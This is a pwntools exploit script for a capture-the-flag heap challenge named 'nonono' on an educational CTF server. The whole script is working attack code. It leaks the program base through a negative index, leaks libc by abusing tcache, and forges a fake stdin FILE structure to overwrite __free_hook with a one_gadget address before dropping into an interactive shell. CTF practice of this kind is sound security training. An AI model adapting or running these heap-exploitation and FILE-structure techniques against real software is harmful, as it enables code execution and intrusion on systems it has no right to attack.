from pwn import *
import time
import sys


def new_note(ind, size, content):
    proc.sendlineafter(b'>>', b'1')
    buf = f'{ind}\n{size}\n'.encode()
    buf += content
    proc.sendafter(b': ', buf)
    #proc.sendlineafter(b': ', f'{ind}'.encode())
    #proc.sendlineafter(b': ', f'{len(content)+1}'.encode())
    #proc.sendlineafter(b': ', content)


def del_note(ind):
    proc.sendlineafter(b'>>', b'3')
    proc.sendlineafter(b': ', f'{ind}'.encode())


def show(ind):
    proc.sendlineafter(b'>>', b'2')
    proc.sendlineafter(b': ', f'{ind}'.encode())
    return proc.recvuntil(b'=')


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    # fake in bss
    # leak heap
    proc.sendlineafter(b'>>', b'2')
    proc.sendlineafter(b': ', b'-7')
    prog_base = proc.recvuntil(b'=')
    prog_base = u64(prog_base[:6] + b'\x00\x00')
    prog_base -= 0x202008
    log.info('prog: ' + hex(prog_base))

    for i in range(8):
        new_note(i, 0x100, b'\n')
    for i in range(8):
        del_note(7 - i)
    new_note(0, 0, b'')
    libc = show(0)
    libc = u64(libc[:6].ljust(8, b'\x00'))
    libc -= 0x3aeda0
    log.info('libc: ' + hex(libc))

    vtable = libc + 0x3ab2a0
    free_hook = libc + 0x3b08e8
    write_adr = free_hook - 4
    size = 14
    lock = prog_base + 0x202800
    fake_stdin = [0x00000000fbad208b, write_adr,
            write_adr, write_adr,
            write_adr, write_adr,
            write_adr, write_adr,
            write_adr + size, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000000,
            0x0000001000000000, 0xffffffffffffffff,
            0x0000000000000000, lock,
            0xffffffffffffffff, 0x0000000000000000,
            0x00007fced5aadae0, 0x0000000000000000,
            0x0000000000000000, 0x0000000000000000,
            0x00000000ffffffff, 0x0000000000000000,
            0x0000000000000000, vtable]


    #free_got = prog_base + 0x201f70
    #read_adr = free_got
    #size = 6
    #buf = flat(0xfbad2887, read_adr, read_adr, read_adr,
    #        read_adr, read_adr + size, read_adr + size,
    #        read_adr, read_adr + 1, 0, 0, 0, 0, 0, 1, -1, 0,
    #        lock, -1, 0, 0, 0, 0, 0, -1)
    buf = flat(*fake_stdin)
    assert b'\n' not in buf[:-1]
    buf += b'\n'
    new_note(0, 0xf0, buf)
    del_note(0)
    new_note(-2, 0xf0, b'\n')
    libc -= 0x3d000
    new_note(0, 9, p64(libc + 0x4f322))
    del_note(0)



if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eductf.zoolab.org 20005'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./nonono'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
